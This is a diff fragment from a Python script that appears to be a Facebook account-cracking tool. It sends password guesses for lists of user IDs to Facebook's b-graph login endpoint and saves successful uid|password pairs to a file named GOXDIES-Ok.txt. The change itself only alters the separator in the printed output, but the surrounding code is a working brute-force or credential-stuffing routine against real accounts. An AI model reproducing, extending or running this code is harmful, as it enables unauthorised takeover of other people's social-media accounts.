@@ -197,16 +197,16 @@ def file_subb(uid,pwx):
             p = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).text
             q=json.loads(p)
             if "session_key" in q:
-                print(f"\r\r  [✓] {uid} | {ps}      ")
+                print(f"\r\r  [✓] {uid} : {ps}      ")
                 open("/sdcard/GOXDIES-Ok.txt","a+").write(uid+"|"+ps+"\n")
                 oks.append(uid)
                 break
             elif "PLEASE, CONFIRM EMAIL: " in q:
-                print(f"\r\r। [✓] {uid} | {ps}      ")
+                print(f"\r\r। [✓] {uid} : {ps}      ")
                 open("/sdcard/GOXDIES-Ok.txt","a+").write(uid+"|"+ps+"\n")
                 oks.append(uid)
             elif "www.facebook.com" in q:
-                print(f"\r\r  [X] {uid} | {ps}      ")
+                print(f"\r\r  [X] {uid} : {ps}      ")
                 cps.append(uid)
             else:
                 continue
